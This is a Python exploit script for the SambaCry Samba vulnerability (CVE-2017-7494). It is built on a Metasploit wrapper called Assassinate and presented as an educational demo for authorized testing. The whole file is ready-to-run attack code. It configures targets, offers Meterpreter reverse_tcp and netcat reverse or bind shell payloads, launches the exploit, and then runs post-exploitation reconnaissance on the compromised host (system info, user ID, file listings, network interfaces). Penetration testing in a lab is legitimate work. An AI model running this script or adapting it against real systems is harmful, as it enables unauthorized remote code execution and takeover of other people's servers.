#!/usr/bin/env python3
"""
SambaCry (CVE-2017-7494) Demo Exploit using Assassinate
========================================================

A simple educational demonstration of exploiting the SambaCry vulnerability
using the Assassinate framework's Python API.

This vulnerability affects Samba versions 3.5.0 - 4.6.4 and allows remote
code execution by uploading a malicious shared library (.so) to a writable
share, then triggering its load.

DISCLAIMER: This script is for authorized security testing and educational
purposes only. Only use against systems you own or have explicit permission
to test.

Usage:
    python sambacry_demo.py <target> [options]

Example:
    # Against the assassinate-target container
    python sambacry_demo.py assassinate-target

    # With custom listener
    python sambacry_demo.py 192.168.1.100 --lhost 192.168.1.50 --lport 4444

Requirements:
    - Assassinate daemon running (assassinate-daemon)
    - Metasploit Framework installed

References:
    - CVE-2017-7494
    - https://www.samba.org/samba/security/CVE-2017-7494.html
    - exploit/linux/samba/is_known_pipename
"""

from __future__ import annotations

import argparse
import asyncio
import sys
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from assassinate.bridge.modules import Module
    from assassinate.bridge.sessions import Session


# Payload options
PAYLOADS = {
    "meterpreter": "linux/x64/meterpreter/reverse_tcp",
    "shell": "cmd/unix/interact",
    "reverse": "cmd/unix/reverse_netcat",
    "bind": "cmd/unix/bind_netcat",
}

# Default to meterpreter for full post-exploitation capabilities
DEFAULT_PAYLOAD = "meterpreter"


def print_banner() -> None:
    """Print exploit banner."""
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║         SambaCry (CVE-2017-7494) Demo Exploit             ║
    ║                  Using Assassinate                        ║
    ║                                                           ║
    ║  Affects: Samba 3.5.0 - 4.6.4                             ║
    ║  Module:  exploit/linux/samba/is_known_pipename           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)


async def check_vulnerability(mod: Module, target: str) -> bool:
    """Check if target is vulnerable before exploiting."""
    print(f"\n[*] Checking if {target} is vulnerable...")

    if await mod.has_check():
        try:
            result = await mod.check()
            print(f"[*] Check result: {result}")

            if "vulnerable" in result.lower():
                print("[+] Target appears VULNERABLE!")
                return True
            elif "safe" in result.lower():
                print("[-] Target appears safe (not vulnerable)")
                return False
            else:
                print("[?] Check result inconclusive, proceeding anyway...")
                return True
        except Exception as e:
            print(f"[!] Check failed: {e}")
            print("[*] Proceeding with exploit anyway...")
            return True
    else:
        print("[*] Module does not support vulnerability check")
        return True


async def run_exploit(
    target: str,
    lhost: str,
    lport: int,
    payload_type: str = DEFAULT_PAYLOAD,
    smb_share: str = "",
    smb_folder: str = "",
    skip_check: bool = False,
) -> int | None:
    """
    Execute the SambaCry exploit against the target.

    Args:
        target: Target IP or hostname
        lhost: Local host for reverse connection
        lport: Local port for reverse connection
        payload_type: Type of payload (shell, reverse, bind, meterpreter)
        smb_share: SMB share name (auto-detected if empty)
        smb_folder: Path within share (auto-detected if empty)
        skip_check: Skip vulnerability check

    Returns:
        Session ID if successful, None otherwise
    """
    # Import here to allow --help without daemon connection
    from assassinate.bridge import Framework, initialize
    from assassinate.ipc.client import MsfClient

    print_banner()
    print(f"[*] Target:  {target}")
    print(f"[*] LHOST:   {lhost}")
    print(f"[*] LPORT:   {lport}")
    print(f"[*] Payload: {PAYLOADS.get(payload_type, payload_type)}")

    # Connect to assassinate daemon
    print("\n[*] Connecting to Assassinate daemon...")
    try:
        initialize()
        fw = Framework()
        # Create separate async client for post-exploitation
        # This is now safe with globally unique call_ids
        client = MsfClient()
        await client.connect()
        print(f"[+] Connected to MSF {fw.version()}")
    except Exception as e:
        print(f"[-] Failed to connect to daemon: {e}")
        print("[!] Make sure assassinate-daemon is running")
        return None

    # Create the exploit module
    samba_cry_module = "exploit/linux/samba/is_known_pipename"
    print(f"\n[*] Loading module: {samba_cry_module}")
    try:
        mod = fw.create_module(samba_cry_module)
        print(f"[+] Module loaded: {mod}")
    except Exception as e:
        print(f"[-] Failed to load module: {e}")
        return None

    # Get module info
    print(f"\n[*] Module: {await mod.fullname()}")
    print(f"[*] Description: {(await mod.description())[:100]}...")
    print(f"[*] Rank: {await mod.rank()}")

    # Configure options
    print("\n[*] Configuring exploit options...")
    await mod.set_option("RHOSTS", target)
    await mod.set_option("RPORT", "445")

    if smb_share:
        await mod.set_option("SMB_SHARE_NAME", smb_share)
        print(f"    SMB_SHARE_NAME = {smb_share}")

    if smb_folder:
        await mod.set_option("SMB_FOLDER", smb_folder)
        print(f"    SMB_FOLDER = {smb_folder}")

    print(f"    RHOSTS = {target}")
    print(f"    RPORT = 445")

    # Check vulnerability (optional)
    if not skip_check:
        is_vuln = await check_vulnerability(mod, target)
        if not is_vuln:
            print("\n[-] Target does not appear vulnerable. Use --skip-check to force.")
            return None

    # Validate configuration
    print("\n[*] Validating module configuration...")
    if not await mod.validate():
        print("[-] Module validation failed!")
        print("[*] Checking for missing options...")
        opts = await mod.options()
        print(opts)
        return None
    print("[+] Configuration valid!")

    # Select payload
    payload = PAYLOADS.get(payload_type, payload_type)
    print(f"\n[*] Using payload: {payload}")

    # Show compatible payloads if requested
    compatible = await mod.compatible_payloads()
    if payload not in compatible:
        print(f"[!] Warning: {payload} may not be compatible")
        print(f"[*] Compatible payloads: {', '.join(compatible[:5])}...")

    # Prepare payload options
    payload_options = {}
    if "reverse" in payload or "meterpreter" in payload:
        payload_options["LHOST"] = lhost
        payload_options["LPORT"] = str(lport)
        print(f"    LHOST = {lhost}")
        print(f"    LPORT = {lport}")

    # Execute!
    print("\n" + "=" * 60)
    print("[*] LAUNCHING EXPLOIT...")
    print("=" * 60)

    try:
        session_id = await mod.exploit(payload, payload_options)

        if session_id:
            print(f"\n[+] SUCCESS! Session {session_id} opened!")
            print("=" * 60)

            # Wait for session to stabilize before querying
            print("[*] Waiting for session to stabilize...")
            await asyncio.sleep(3)

            # Get session type with retry
            session_type = "shell"  # default
            for attempt in range(3):
                try:
                    session_type = await asyncio.wait_for(
                        client.session_type(session_id),
                        timeout=10.0
                    )
                    break
                except asyncio.TimeoutError:
                    if attempt < 2:
                        print(f"[*] Retrying session info ({attempt + 1}/3)...")
                        await asyncio.sleep(2)
                except Exception as e:
                    print(f"[!] Could not get session type: {e}")
                    break

            print(f"\n[*] Session Details:")
            print(f"    ID:   {session_id}")
            print(f"    Type: {session_type}")

            # For meterpreter, wait more for it to stabilize
            if session_type == "meterpreter":
                print("[*] Waiting for Meterpreter to fully initialize...")
                await asyncio.sleep(3)

            # Gather and display target information (proof of exploitation)
            await gather_target_info(client, session_id, session_type)

            print(f"\n[+] Interact with: sessions().get({session_id})")
            return session_id
        else:
            print("\n[-] Exploit completed but no session was created")
            print("[*] This could mean:")
            print("    - Target is patched")
            print("    - Firewall blocking connection")
            print("    - Wrong share/folder path")
            return None

    except Exception as e:
        print(f"\n[-] Exploit failed: {e}")
        return None
    finally:
        # Cleanup our client connection
        if client:
            await client.disconnect()


async def get_session_type(session: Session) -> str:
    """Get session type string."""
    try:
        return session.session_type()
    except Exception:
        return "unknown"


async def gather_target_info(client, session_id: int, session_type: str) -> None:
    """
    Gather and display information from the compromised target.

    This proves successful exploitation by extracting real data from the target.
    """
    print("\n" + "=" * 60)
    print("  TARGET INFORMATION (Proof of Exploitation)")
    print("=" * 60)

    try:
        if session_type == "meterpreter":
            # Meterpreter session - use rich API
            print("\n[*] Gathering system information via Meterpreter...")

            # System info
            try:
                sysinfo = await client.session_sys_sysinfo(session_id)
                print("\n┌─ System Information ─────────────────────────────")
                print(f"│  Computer:     {sysinfo.get('Computer', 'N/A')}")
                print(f"│  OS:           {sysinfo.get('OS', 'N/A')}")
                print(f"│  Architecture: {sysinfo.get('Architecture', 'N/A')}")
                print(f"│  Domain:       {sysinfo.get('Domain', 'N/A')}")
                print("└──────────────────────────────────────────────────")
            except Exception as e:
                print(f"[!] Could not get sysinfo: {e}")

            # Current user
            try:
                uid = await client.session_sys_getuid(session_id)
                print(f"\n[+] Running as: {uid}")
            except Exception as e:
                print(f"[!] Could not get uid: {e}")

            # Working directory
            try:
                pwd = await client.session_fs_pwd(session_id)
                print(f"[+] Working directory: {pwd}")
            except Exception as e:
                print(f"[!] Could not get pwd: {e}")

            # List files in current directory
            try:
                files = await client.session_fs_ls(session_id, pwd)
                print(f"\n┌─ Directory Listing ({pwd}) ─────────────────────")
                for f in files[:10]:  # Limit to first 10
                    print(f"│  {f}")
                if len(files) > 10:
                    print(f"│  ... and {len(files) - 10} more files")
                print("└──────────────────────────────────────────────────")
            except Exception as e:
                print(f"[!] Could not list directory: {e}")

            # Network interfaces
            try:
                interfaces = await client.session_net_get_interfaces(session_id)
                print("\n┌─ Network Interfaces ─────────────────────────────")
                for iface in interfaces[:5]:
                    addrs = iface.get('addrs', [])
                    name = iface.get('mac_name', 'Unknown')
                    print(f"│  {name}: {', '.join(addrs[:3])}")
                print("└──────────────────────────────────────────────────")
            except Exception as e:
                print(f"[!] Could not get interfaces: {e}")

            # Process ID
            try:
                pid = await client.session_process_getpid(session_id)
                print(f"\n[+] Meterpreter PID: {pid}")
            except Exception as e:
                print(f"[!] Could not get PID: {e}")

        else:
            # Shell session - use shell commands
            print("\n[*] Gathering information via shell commands...")

            # Run basic commands
            commands = [
                ("id", "User Identity"),
                ("uname -a", "System Info"),
                ("pwd", "Working Directory"),
                ("hostname", "Hostname"),
            ]

            for cmd, desc in commands:
                try:
                    output = await client.session_run_cmd(session_id, cmd, timeout=5)
                    output = output.strip()
                    if output:
                        print(f"\n[+] {desc}:")
                        print(f"    {output}")
                except Exception as e:
                    print(f"[!] Could not run '{cmd}': {e}")

            # List files
            try:
                output = await client.session_run_cmd(session_id, "ls -la | head -15", timeout=5)
                if output.strip():
                    print("\n┌─ Directory Listing ─────────────────────────────")
                    for line in output.strip().split('\n')[:10]:
                        print(f"│  {line}")
                    print("└──────────────────────────────────────────────────")
            except Exception as e:
                print(f"[!] Could not list directory: {e}")

    except Exception as e:
        print(f"\n[!] Error gathering target info: {e}")

    print("\n" + "=" * 60)
    print("  EXPLOITATION SUCCESSFUL - Target compromised!")
    print("=" * 60)


def main() -> None:
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="SambaCry (CVE-2017-7494) Demo using Assassinate",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Basic usage against docker target (uses meterpreter by default)
    %(prog)s assassinate-target --lhost 172.20.0.1

    # With simple shell (no LHOST needed)
    %(prog)s assassinate-target --payload shell

    # With custom listener settings
    %(prog)s 192.168.1.100 --lhost 192.168.1.50 --lport 4444

    # Skip vulnerability check
    %(prog)s assassinate-target --lhost 172.20.0.1 --skip-check

Available payload types:
    meterpreter - Linux Meterpreter (default, full post-exploitation)
    shell       - Simple command shell
    reverse     - Reverse netcat shell
    bind        - Bind netcat shell
        """
    )

    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument(
        "--lhost", "-l",
        default="0.0.0.0",
        help="Local host for reverse connections (default: 0.0.0.0)"
    )
    parser.add_argument(
        "--lport", "-p",
        type=int,
        default=4444,
        help="Local port for reverse connections (default: 4444)"
    )
    parser.add_argument(
        "--payload", "-P",
        default=DEFAULT_PAYLOAD,
        choices=list(PAYLOADS.keys()),
        help="Payload type (default: meterpreter)"
    )
    parser.add_argument(
        "--share", "-s",
        default="",
        help="SMB share name (auto-detected if not specified)"
    )
    parser.add_argument(
        "--folder", "-f",
        default="",
        help="Folder path within share (auto-detected if not specified)"
    )
    parser.add_argument(
        "--skip-check",
        action="store_true",
        help="Skip vulnerability check"
    )

    args = parser.parse_args()

    # Run the exploit
    session_id = asyncio.run(run_exploit(
        target=args.target,
        lhost=args.lhost,
        lport=args.lport,
        payload_type=args.payload,
        smb_share=args.share,
        smb_folder=args.folder,
        skip_check=args.skip_check,
    ))

    sys.exit(0 if session_id else 1)


if __name__ == "__main__":
    main()
